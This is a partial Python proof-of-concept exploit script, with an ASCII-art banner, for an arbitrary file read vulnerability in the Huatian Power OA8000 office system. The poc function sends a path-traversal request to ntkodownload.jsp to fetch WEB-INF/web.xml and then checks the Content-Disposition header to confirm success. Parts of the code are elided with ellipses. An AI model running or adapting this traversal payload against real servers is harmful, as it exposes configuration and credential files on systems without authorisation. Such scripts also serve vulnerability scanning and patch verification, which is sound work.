               ...
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                ...
                88        88           88     "88,  88 88     `888   `"Y88888P"   
                            ...
                            888888888888 
                                        ...
                                        tag: this is a 华天动力OA8000办公系统ntkodownload.jsp存在任意文件读取漏洞
...
def poc(target):
    if target[-1] == '/':
        ...
        target = target
    path = "/OAapp/jsp/trace/ntkodownload.jsp?filename=../../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml"
    url = target + path
    headers = {
    ...
    try:
        ...
        if response1.status_code == 200 and "web.xml" in response1.headers.get("Content-Disposition", ""):
